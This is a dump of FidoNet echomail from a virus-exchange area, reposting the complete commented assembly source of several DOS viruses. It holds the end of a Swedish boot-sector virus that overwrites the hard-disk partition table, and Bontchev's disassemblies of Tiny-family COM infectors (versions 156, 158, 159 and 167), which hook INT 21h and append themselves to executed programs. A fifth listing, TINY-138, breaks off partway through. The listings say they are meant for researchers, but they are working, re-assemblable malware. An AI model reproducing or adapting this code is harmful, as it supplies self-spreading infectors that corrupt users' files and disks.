    mov [bx],ax         ; Reservera plats fФr viruset.

    mov cl,06h
    shl ax,cl
    mov es,ax           ; Omvandla till segment addres.

    mov Word Ptr TmpVec,Offset Int13h
    mov Word Ptr TmpVec+2,es
    push    es
    sub ax,ax
    mov es,ax
    push    cs
    pop ds
    mov si,Offset TmpVec
    mov di,004Ch
    mov cx,0004h
    rep movsb
    pop es

    sub si,si
    mov di,si
    mov cx,0200h        ; Hela viruset + lite till.
    rep movsb

    mov ax,Offset Here
    push    es
    push    ax
    ret             ; Hoppa till viruset.

Here:   sub ax,ax
    int 13h             ; ПterstДll driven

    sub ax,ax
    mov es,ax
    mov ax,0201h                ; LДs en sector funk.
    mov bx,7C00h        ; Hit laddas booten normalt.
    mov cx,BootPek
    mov dx,BootPek+2
    int 13h

    push    cs
    pop es
    mov ax,0201h
    mov bx,0200h
    mov cx,0001h
    mov dx,0080h
    int 13h                     ; LДs in partions tabellen.
    jc  Over
    push    cs
    pop ds
    mov si,0200h
    sub di,di
    lodsw
    cmp ax,[di]         ; Kolla om den Дr smittad.
    jne HdInf
    lodsw
    cmp ax,[di+2]
    jne HdInf

Over:   mov BootPek,0003h
    mov BootPek+2,0100h
    sub bx,bx
    push    bx
    mov bx,7C00h
    push    bx
    ret             ; KФr den gamla booten.

HdInf:  mov BootPek,0007h
    mov BootPek+2,0080h

    mov ax,0301h
    mov bx,0200h
    mov cx,0007h
    mov dx,0080h
    int 13h         ; Flytta orgin. part.tabellen.
    jc  Over

    push    cs
    pop ds
    push    cs
    pop es
    mov si,03BEh
    mov di,01BEh
    mov cx,0042h
    cld
    rep movsb           ; Kopiera part. data till viruset.

    mov ax,0301h
    sub bx,bx
    mov cx,0001h
    mov dx,0080h
    int 13h         ; Skriv viruset till part. tabellen.


    sub ax,ax
    mov es,ax                   ; Kolla om msg:et ska skrivas ut.
    test    Byte Ptr es:[046Ch],07h
    jnz HdInf1

    mov si,Offset Txt           ; Detta utfФrs bara om man bootar frЖn
    cld                             ; diskett.
Foo1:   lodsb
    cmp al,00h
    je  HdInf1
    mov ah,0Eh
    sub bx,bx
    int 10h
    jmp Foo1

HdInf1: jmp Over

Slutet  Label   Byte            ; AnvДnds fФr att veta var slutet Дr.

Txt db  07h,0Ah,0Dh,'The Swedish Disaster I',0Ah,0Dh,00h

Main    Endp
Code    Ends
    End

-+-  GEcho 1.00
 + Origin: The PRO-Point on a PRO-BBS and a PRO-*.* ...Ciaro?... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/3            Enable 32-bit processing

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 43 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:11 
 To   : -  *.*  -                                                               
 Subj : TINY_156.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5ef5
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Gilbert Holleman, 2:283/718 (06 Nov 94 16:30)
* To   : Graham Allen
* Subj : TINY_156.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Gilbert.Holleman@f718.n283.z2.fidonet.org
    page    ,132
    name    TINY156
    title   The 'Tiny' virus, version TINY-156
    .radix  16

; ╔══════════════════════════════════════════════════════════════════════════╗
; ·  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 ·
; ·  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255        ·
; ·                                      ·
; ·          The 'Tiny' Virus, version TINY-156                  ·
; ·      Disassembled by Vesselin Bontchev, September 1990       ·
; ·                                      ·
; ·          Copyright (c) Vesselin Bontchev 1989, 1990          ·
; ·                                      ·
; ·  This listing is only to be made available to virus researchers      ·
; ·        or software writers on a need-to-know basis.          ·
; ╚══════════════════════════════════════════════════════════════════════════╝

; The disassembly has been tested by re-assembly using MASM 5.0.

code    segment
    assume  cs:code, ds:code

    org 100

seg_60  equ 600
v_len   equ v_end-first4

start:
    jmp v_entry     ; Jump to virus code
    db  'M'             ; Virus signature
    mov ax,4C00     ; Program terminate
    int 21

; The original first 4 bytes of the infected file:

first4  db  0EBh, 2, 90, 90

v_entry:
    mov si,0FF      ; Determine the start addres of the virus body
    add si,[si+2]

    mov di,offset start ; Put the addres of program start on the stack
    push    di      ; Now a Near RET instruction will jump there

    push    ax      ; Save AX (to keep programs as DISKCOPY happy)

    movsw           ; Restore the original first 4 bytes
    movsw

    mov di,seg_60+4 ; Point ES:DI at 0000:0604h (i.e, segment 60h)
    xor cx,cx       ; ES := 0
    mov es,cx
    mov cl,v_len-2  ; CX := virus length
    lodsw           ; Check if virus is present in memory
    scasw
    je  run     ; Just run the program if so

; Virus not in memory. Install it there:

    dec di      ; Adjust DI
    dec di
    stosw           ; Store the first word of the virus body
    rep movsb       ; Store the rest of the virus

    mov di,32*4     ; Old INT 21h handler will be moved to INT 32h
    mov ax,int_21-first4+seg_60

; Move the INT 21h handler to INT 32h and
; install int_21 as new INT 21h handler:

    xchg    ax,cx
vect_cpy:
    xchg    ax,cx
    xchg    ax,word ptr es:[di-(32-21)*4]
    stosw
    jcxz    vect_cpy    ; Loop until done

run:
    pop ax      ; Restore AX
    push    ds      ; ES := DS
    pop es

; Jump to program start via funny RET instruction:

    ret

int_21:             ; New INT 21h handler
    cmp ax,4B00     ; EXEC function call?
    jne end_21      ; Exit if not

    push    ax      ; Save registers used
    push    bx
    push    cx
    push    dx
    push    di
    push    ds
    push    es

    push    cs      ; ES := CS
    pop es

    mov ax,3D02     ; Open the file for both reading and writting
    int 32
    jc  end_exec    ; Exit on error
    xchg    ax,bx       ; Save the file handle in BX

    mov al,0
    call    lseek

    mov ah,3F       ; Read the first 4 bytes of the file
    mov di,dx       ; Save first4 address in DI
    push    cs      ; DS := CS
    pop ds
    int 32      ; Do it

; Check whether the file is already infected or is an .EXE file.
; The former contains the character `M' in its 3rd byte and
; the latter contains it either in the 0th or in the 1st byte.

    push    di      ; Save DI
    mov al,'M'          ; Look for `M'
    repne   scasb
    pop di      ; Restore DI
    je  close       ; Exit if file not suitable for infection

    mov al,2        ; Seek to the end of file
    call    lseek

    push    ax      ; Save file length

    mov cl,v_len    ; Length of virus body
    mov ah,40       ; Append virus to file
    int 32      ; Do it

    mov al,0        ; Seek to the file beginning
    call    lseek

    mov al,0E9      ; Near JMP opcode
    stosb           ; Form the first instruction of the file
    pop ax      ; Restore file length in AX
    inc ax
    stosw           ; Form the JMP's opperand
    mov al,'M'          ; Add a `M' character to mark the file
    stosb           ;  as infected

    mov ah,40
    int 32      ; Do it

close:
    mov ah,3E       ; Close the file
    int 32

end_exec:
    pop es      ; Restore used registers
    pop ds
    pop di
    pop dx
    pop cx
    pop bx
    pop ax

; Exit through the original INT 21h handler:

end_21:
    jmp dword ptr cs:[32*4]

lseek:
    mov ah,42       ; Lseek either to file beginning or to file end
    xor cx,cx
    xor dx,dx
    int 32      ; Do it

    mov dh,6        ; Put 6 in DH and 4 in CL
    mov cl,4
    ret         ; Done

v_end   equ $       ; End of virus body

code    ends
    end start

-+-  Concord/QWK O.O1 Beta-7
 + Origin: Miami Beach BBS - Nijmegen Nl - 080-732083 - ZyX 19K2 (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/m#           Allow # multiple passes to resolve forward references

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 44 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:12 
 To   : -  *.*  -                                                               
 Subj : TINY_158.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f11
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Bill Dirks, 2:283/718 (06 Nov 94 16:32)
* To   : Gilbert Holleman
* Subj : TINY_158.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Bill.Dirks@f718.n283.z2.fidonet.org
    page    ,132
    name    TINY158
    title   The 'Tiny' virus, version TINY-158
    .radix  16

; ╔══════════════════════════════════════════════════════════════════════════╗
; ·  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 ·
; ·  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255        ·
; ·                                      ·
; ·          The 'Tiny' Virus, version TINY-158                  ·
; ·         Disassembled by Vesselin Bontchev, July 1990         ·
; ·                                      ·
; ·          Copyright (c) Vesselin Bontchev 1989, 1990          ·
; ·                                      ·
; ·  This listing is only to be made available to virus researchers      ·
; ·        or software writers on a need-to-know basis.          ·
; ╚══════════════════════════════════════════════════════════════════════════╝

; The disassembly has been tested by re-assembly using MASM 5.0.

code    segment
    assume  cs:code, ds:code

    org 100

seg_60  equ 600
v_len   equ v_end-first4

start:
    jmp v_entry     ; Jump to virus code
    db  'M'             ; Virus signature
    mov ax,4C00     ; Program terminate
    int 21

; The original first 4 bytes of the infected file:

first4  db  0EBh, 2, 90, 90

v_entry:
    mov si,0FF      ; Determine the start addres of the virus body
    add si,[si+2]

    mov di,offset start ; Put the addres of program start on the stack
    push    di      ; Now a Near RET instruction will jump there

    push    ax      ; Save AX (to keep programs as DISKCOPY happy)

    movsw           ; Restore the original first 4 bytes
    movsw

    mov di,seg_60+4 ; Point ES:DI at 0000:0604h (i.e, segment 60h)
    xor cx,cx       ; ES := 0
    mov es,cx
    mov cl,v_len-2  ; CX := virus length
    lodsw           ; Check if virus is present in memory
    scasw
    je  run     ; Just run the program if so

; Virus not in memory. Install it there:

    dec di      ; Adjust DI
    dec di
    stosw           ; Store the first word of the virus body
    rep movsb       ; Store the rest of the virus

    mov di,32*4     ; Old INT 21h handler will be moved to INT 32h
    mov ax,int_21-first4+seg_60

; Move the INT 21h handler to INT 32h and
; install int_21 as new INT 21h handler:

    xchg    ax,cx
vect_cpy:
    xchg    ax,cx
    xchg    ax,word ptr es:[di-(32-21)*4]
    stosw
    jcxz    vect_cpy    ; Loop until done

run:
    pop ax      ; Restore AX
    push    ds      ; ES := DS
    pop es

; Jump to program start via funny RET instruction:

    ret

int_21:             ; New INT 21h handler
    cmp ax,4B00     ; EXEC function call?
    jne end_21      ; Exit if not

    push    ax      ; Save registers used
    push    bx
    push    cx
    push    dx
    push    di
    push    ds
    push    es

    push    cs      ; ES := CS
    pop es

    mov ax,3D02     ; Open the file for both reading and writting
    int 32
    jc  end_exec    ; Exit on error
    xchg    bx,ax       ; Save the file handle in BX

    mov ah,3F       ; Read the first 4 bytes of the file
    mov cx,4        ; 4 bytes to read
    mov dx,seg_60   ; Put them in first4
    mov di,dx       ; Save first4 address in DI
    push    cs      ; DS := CS
    pop ds
    int 32      ; Do it

; Check whether the file is already infected or is an .EXE file.
; The former contains the character `M' in its 3rd byte and
; the latter contains it either in the 0th or in the 1st byte.

    push    di      ; Save DI
    mov al,'M'          ; Look for `M'
    repne   scasb
    pop di      ; Restore DI
    je  close       ; Exit if file not suitable for infection

    mov ax,4202     ; Seek to the end of file
    xor cx,cx
    xor dx,dx
    int 32      ; Do it

    push    ax      ; Save file length

    mov dh,6        ; DX = 600h, i.e. point it at 0000:0600h
    mov cl,v_len    ; Length of virus body
    mov ah,40       ; Append virus to file
    int 32      ; Do it

    mov ax,4200     ; Seek to the file beginning
    xor cx,cx
    xor dx,dx
    int 32      ; Do it

    mov dx,di       ; Point DX at first4
    mov al,0E9      ; Near JMP opcode
    stosb           ; Form the first instruction of the file
    pop ax      ; Restore file length in AX
    inc ax
    stosw           ; Form the JMP's opperand
    mov al,'M'          ; Add a `M' character to mark the file
    stosb           ;  as infected

    mov cl,4        ; Overwrite the first 4 bytes of the file
    mov ah,40
    int 32      ; Do it

close:
    mov ah,3E       ; Close the file
    int 32

end_exec:
    pop es      ; Restore used registers
    pop ds
    pop di
    pop dx
    pop cx
    pop bx
    pop ax

; Exit through the original INT 21h handler:

end_21:
    jmp dword ptr cs:[32*4]

v_end   equ $       ; End of virus body

code    ends
    end start

-+-  FastEcho/386 1.41.b7/Real
 + Origin: Poeldijk, The Netherlands, Europe, Earth (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/a,/s         Alphabetic or Source-code segment ordering

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 45 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:12 
 To   : -  *.*  -                                                               
 Subj : TINY_159.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f19
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Clif Jessop, 2:283/718 (06 Nov 94 16:32)
* To   : Viral Doctor
* Subj : TINY_159.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Clif.Jessop@f718.n283.z2.fidonet.org
    page    ,132
    name    TINY159
    title   The 'Tiny' virus, version TINY-159
    .radix  16

; ╔══════════════════════════════════════════════════════════════════════════╗
; ·  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 ·
; ·  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255        ·
; ·                                      ·
; ·          The 'Tiny' Virus, version TINY-159                  ·
; ·         Disassembled by Vesselin Bontchev, July 1990         ·
; ·                                      ·
; ·          Copyright (c) Vesselin Bontchev 1989, 1990          ·
; ·                                      ·
; ·  This listing is only to be made available to virus researchers      ·
; ·        or software writers on a need-to-know basis.          ·
; ╚══════════════════════════════════════════════════════════════════════════╝

; The disassembly has been tested by re-assembly using MASM 5.0.

code    segment
    assume  cs:code, ds:code

    org 100

seg_60  equ 600
v_len   equ v_end-first4

start:
    jmp v_entry     ; Jump to virus code
    db  'M'             ; Virus signature
    mov ax,4C00     ; Program terminate
    int 21

; The original first 4 bytes of the infected file:

first4  db  0EBh, 2, 90, 90

v_entry:
    mov si,0FF      ; Determine the start addres of the virus body
    add si,[si+2]

    mov di,offset start ; Put the addres of program start on the stack
    push    di      ; Now a Near RET instruction will jump there

    push    ax      ; Save AX (to keep programs as DISKCOPY happy)

    movsw           ; Restore the original first 4 bytes
    movsw

    mov di,seg_60+4 ; Point ES:DI at 0000:0604h (i.e, segment 60h)
    xor cx,cx       ; ES := 0
    mov es,cx
    mov cl,v_len-2  ; CX := virus length
    lodsw           ; Check if virus is present in memory
    scasw
    je  run     ; Just run the program if so

; Virus not in memory. Install it there:

    dec di      ; Adjust DI
    dec di
    stosw           ; Store the first word of the virus body
    rep movsb       ; Store the rest of the virus

    mov di,32*4     ; Old INT 21h handler will be moved to INT 32h
    mov ax,int_21-first4+seg_60        ; Offset

; Move the INT 21h handler to INT 32h and
; install int_21 as new INT 21h handler:

vect_cpy:
    xchg    ax,word ptr es:[di-(32-21)*4]
    stosw
    xchg    ax,cx
    test    ax,ax
    jz  vect_cpy    ; Loop until done

run:
    pop ax      ; Restore AX
    push    ds      ; ES := DS
    pop es

; Jump to program start via funny RET instruction:

    ret

int_21:             ; New INT 21h handler
    cmp ax,4B00     ; EXEC function call?
    jne end_21      ; Exit if not

    push    ax      ; Save registers used
    push    bx
    push    cx
    push    dx
    push    di
    push    ds
    push    es

    push    cs      ; ES := CS
    pop es

    mov ax,3D02     ; Open the file for both reading and writting
    int 32
    jc  end_exec    ; Exit on error
    xchg    bx,ax       ; Save the file handle in BX

    mov ah,3F       ; Read the first 4 bytes of the file
    mov cx,4        ; 4 bytes to read
    mov dx,seg_60   ; Put them in first4
    mov di,dx       ; Save first4 address in DI
    push    cs      ; DS := CS
    pop ds
    int 32      ; Do it

; Check whether the file is already infected or is an .EXE file.
; The former contains the character `M' in its 3rd byte and
; the latter contains it either in the 0th or in the 1st byte.

    push    di      ; Save DI
    mov al,'M'          ; Look for `M'
    repne   scasb
    pop di      ; Restore DI
    je  close       ; Exit if file not suitable for infection

    mov ax,4202     ; Seek to the end of file
    xor cx,cx
    xor dx,dx
    int 32      ; Do it

    push    ax      ; Save file length

    mov dh,6        ; DX = 600h, i.e. point it at 0000:0600h
    mov cl,v_len    ; Length of virus body
    mov ah,40       ; Append virus to file
    int 32      ; Do it

    mov ax,4200     ; Seek to the file beginning
    xor cx,cx
    xor dx,dx
    int 32      ; Do it

    mov dx,di       ; Point DX at first4
    mov al,0E9      ; Near JMP opcode
    stosb           ; Form the first instruction of the file
    pop ax      ; Restore file length in AX
    inc ax
    stosw           ; Form the JMP's opperand
    mov al,'M'          ; Add a `M' character to mark the file
    stosb           ;  as infected

    mov cl,4        ; Overwrite the first 4 bytes of the file
    mov ah,40
    int 32      ; Do it

close:
    mov ah,3E       ; Close the file
    int 32

end_exec:
    pop es      ; Restore used registers
    pop ds
    pop di
    pop dx
    pop cx
    pop bx
    pop ax

; Exit through the original INT 21h handler:

end_21:
    jmp dword ptr cs:[32*4]

v_end   equ $       ; End of virus body

code    ends
    end start

-+-  FidoPCB v1.4 [NR]
 + Origin: Hans' Point with DOSBoss West, Amsterdam (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/m#           Allow # multiple passes to resolve forward references

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 46 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:12 
 To   : -  *.*  -                                                               
 Subj : TINY_167.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f23
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Daniel Hendry, 2:283/718 (06 Nov 94 16:34)
* To   : Viral Doctor
* Subj : TINY_167.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Daniel.Hendry@f718.n283.z2.fidonet.org
    page    ,132
    name    TINY167
    title   The 'Tiny' virus, version TINY-167
    .radix  16

; ╔══════════════════════════════════════════════════════════════════════════╗
; ·  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 ·
; ·  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255        ·
; ·                                      ·
; ·          The 'Tiny' Virus, version TINY-167                  ·
; ·         Disassembled by Vesselin Bontchev, July 1990         ·
; ·                                      ·
; ·          Copyright (c) Vesselin Bontchev 1989, 1990          ·
; ·                                      ·
; ·  This listing is only to be made available to virus researchers      ·
; ·        or software writers on a need-to-know basis.          ·
; ╚══════════════════════════════════════════════════════════════════════════╝

; The disassembly has been tested by re-assembly using MASM 5.0.

code    segment
    assume  cs:code, ds:code

    org 100

seg_60  equ 600
v_len   equ v_end-first4

start:
    call    v_entry     ; Jump to virus code
    db  'M'             ; Virus signature
    mov ax,4C00     ; Program terminate
    int 21

; The original first 4 bytes of the infected file:

first4  db  0EBh, 2, 90, 90

v_entry:
    pop si      ; Determine the start addres of the virus body
    add si,[si-2]

; Save the original first 4 bytes of the infected file on the stack:

    push    word ptr ds:[si-4]
    push    word ptr ds:[si-2]

    push    ax      ; Save AX (to keep programs as DISKCOPY happy)

    mov di,seg_60+4 ; Point ES:DI at 0000:0604h (i.e, segment 60h)
    xor cx,cx       ; ES := 0
    mov es,cx
    mov cl,v_len-2  ; CX := virus length
    lodsw           ; Check if virus is present in memory
    scasw
    je  run     ; Just run the program if so

; Virus not in memory. Install it there:

    dec di      ; Adjust DI
    dec di
    stosw           ; Store the first word of the virus body
    rep movsb       ; Store the rest of the virus

    mov di,32*4     ; Old INT 21h handler will be moved to INT 32h
    mov cl,2        ; The vector is 2 words long
    mov ax,int_21-first4+seg_60        ; Offset

; Move the INT 21h handler to INT 32h and
; install int_21 as new INT 21h handler:

vect_cpy:
    xchg    ax,word ptr es:[di-(32-21)*4]
    stosw
    mov ax,es       ; Segment
    loop    vect_cpy    ; Loop until done

run:
    mov di,offset start ; Point DI at program start
    pop ax      ; Restore AX
    pop word ptr ds:[di+2]  ; Restore the original first 4 bytes
    pop word ptr ds:[di]    ;  of the file
    push    ds      ; ES := DS
    pop es
    jmp di      ; Go

int_21:             ; New INT 21h handler
    cmp ax,4B00     ; EXEC function call?
    jne end_21      ; Exit if not

    push    ax      ; Save registers used
    push    bx
    push    cx
    push    dx
    push    di
    push    ds
    push    es

    push    cs      ; ES := CS
    pop es

    mov ax,3D02     ; Open the file for both reading and writting
    int 32
    jc  end_exec    ; Exit on error
    xchg    bx,ax       ; Save the file handle in BX

    mov ah,3F       ; Read the first 4 bytes of the file
    mov cx,4        ; 4 bytes to read
    mov dx,seg_60   ; Put them in first4
    mov di,dx       ; Save first4 address in DI
    push    cs      ; DS := CS
    pop ds
    int 32      ; Do it

; Check whether the file is already infected or is an .EXE file.
; The former contains the character `M' in its 3rd byte and
; the latter contains it either in the 0th or in the 1st byte.

    push    di      ; Save DI
    mov al,'M'          ; Look for `M'
    repne   scasb
    pop di      ; Restore DI
    je  close       ; Exit if file not suitable for infection

    mov ax,4202     ; Seek to the end of file
    xor cx,cx
    xor dx,dx
    int 32      ; Do it

    push    ax      ; Save file length

    mov dh,6        ; DX = 600h, i.e. point it at 0000:0600h
    mov cl,v_len    ; Length of virus body
    mov ah,40       ; Append virus to file
    int 32      ; Do it

    mov ax,4200     ; Seek to the file beginning
    xor cx,cx
    xor dx,dx
    int 32      ; Do it

    mov dx,di       ; Point DX at first4
    mov al,0E8      ; Near CALL opcode
    stosb           ; Form the first instruction of the file
    pop ax      ; Restore file length in AX
    inc ax
    stosw           ; Form the CALL's opperand
    mov al,'M'          ; Add a `M' character to mark the file
    stosb           ;  as infected

    mov cl,4        ; Overwrite the first 4 bytes of the file
    mov ah,40
    int 32      ; Do it

close:
    mov ah,3E       ; Close the file
    int 32

end_exec:
    pop es      ; Restore used registers
    pop ds
    pop di
    pop dx
    pop cx
    pop bx
    pop ax

; Exit through the original INT 21h handler:

end_21:
    jmp dword ptr cs:[32*4]

v_end   equ $       ; End of virus body

code    ends
    end start

-+-  PPoint 1.86
 + Origin: <Rudy's Place - Israel> Hard disks never die... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

Syntax:  TASM [options] source [,object] [,listing] [,xref]

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 47 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:12 
 To   : -  *.*  -                                                               
 Subj : TINY_138.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f29
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Graham Allen, 2:283/718 (06 Nov 94 16:34)
* To   : Fred Lee
* Subj : TINY_138.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Graham.Allen@f718.n283.z2.fidonet.org
    page    ,132
    name    TINY138
    title   The 'Tiny' virus, version TINY-138
    .radix  16

; ╔══════════════════════════════════════════════════════════════════════════╗
; ·  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 ·
; ·  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255        ·
; ·                                      ·
; ·          The 'Tiny' Virus, version TINY-138                  ·
; ·      Disassembled by Vesselin Bontchev, September 1990       ·
; ·                                      ·
; ·          Copyright (c) Vesselin Bontchev 1989, 1990          ·
; ·                                      ·
; ·  This listing is only to be made available to virus researchers      ·
; ·        or software writers on a need-to-know basis.          ·
; ╚══════════════════════════════════════════════════════════════════════════╝

; The disassembly has been tested by re-assembly using MASM 5.0.

code    segment
    assume  cs:code, ds:code

    org 100

seg_60  equ 600
v_len   equ v_end-first4

start:
    jmp v_entry     ; Jump to virus code
    db  'M'             ; Virus signature
    mov ax,4C00     ; Program terminate
    int 21

; The original first 4 bytes of the infected file:

first4  db  0EBh, 2, 90, 90

v_entry:
    mov si,0FF      ; Initialize some registers
    mov di,offset start ; Put the addres of program start in DI
    mov bx,int_21-first4+seg_60 ; Point BX at new INT 13h handler

; The virus will be installed in memory at
; address 0050:0100h (i.e., at segment 60h):

    mov cx,50

    add si,[si+2]   ; Determine the start addres of the virus body

    push    di      ; Now a Near RET instruction will run the prg.

    movsw           ; Restore the original first 4 bytes
    movsw

    mov es,cx       ; Point ES:DI at 0050:0100h
    cmpsb           ; Check if the virus is present in memory
    jz  run     ; Just run the program if so

; Virus not in memory. Install it there:

    dec si      ; Correct SI & DI to point at the start of
    dec di      ;  virus code and to destination address
    rep movsw       ; Move the virus there

    mov es,cx       ; ES := 0

; Move the INT 21h handler to INT 32h and
; install int_21 as new INT 21h handler.
; By the way, now DI == 1A4h (i.e., 69h*4):

    xchg    ax,bx       ; Thransfer INT 21h vector to INT 69h,
    xchg    ax,cx       ;  preserving AX
lp:
    xchg    ax,cx       ; Get a word
    xchg    ax,es:[di-(69-21)*4]    ; Swap the two words
    stosw           ; Save the word
    jcxz    lp      ; Loop until done (two times)

    xchg    ax,bx       ; Restore AX (to keep progs as DISKCOPY happy)

run:
    push    ds      ; Restore ES
    pop es
    ret         ; And exit (go to CS:100h)

int_21:             ; New INT 21h handler
    cmp ax,4B00     ; EXEC function call?
    jne end_21      ; Exit if not

    push    ax      ; Save registers used
    push    bx
    push    dx
    push    ds
    push    es

    mov ax,3D02     ; Open the file for both reading and writting
    call    do_int21
    jc  end_exec    ; Exit on error

    cbw         ; Zero AH
    cwd         ; Zero DX
    mov bx,si       ; Save handle in BX
    mov ds,ax       ; Set DS and ES to 60h,
    mov es,ax       ;  the virus data segment

    mov ah,3F       ; Read the first 4 bytes
    int 69

; Check whether the file is already infected or is an .EXE file.
; The former contains the character `M' in its 3rd byte and
; the latter contains it either in the 0th or in the 1st byte.

    mov al,'M'          ; Look for `M'
    repne   scasb
    jz  close       ; Exit if file not suitable for infection

    mov al,2        ; Seek to the end of file
    call    lseek       ; SI now contains the file size

    mov cl,v_len    ; Length of virus body
    int 69      ; Append the virus to the file (AH is now 40h)

    mov al,0E9      ; Near JMP opcode
    stosb           ; Form the first instruction of the file
    inc si      ; Add 1 to file size for the JMP
    xchg    ax,si       ; Move it in AX
    stosw           ; Form the JMP's opperand
    mov al,'M'          ; Add a `M' character to mark the file
    stosb           ;  as infected

    xchg    ax,dx       ; Zero AX
    call    lseek       ; Seek to the beginning
    int 69      ; AH is 40h, write the JMP instruction

close:
    mov ah,3E       ; Close the file
    int 69

end_exec:
    pop es      ; Restore used registers
    pop ds
    pop dx
    pop bx
    pop ax

; Exit through the original INT 21h handler:

end_21:
    jmp dword ptr cs:[69*4]

lseek:
    mov ah,42       ; Seek operation
    cwd         ; Zero DX
do_int21:
    xor cx,cx       ; External entry for Open
    int 69
    mov cl,4        ; 4 bytes will be read/written
    xchg    ax,si       ; Store AX in SI
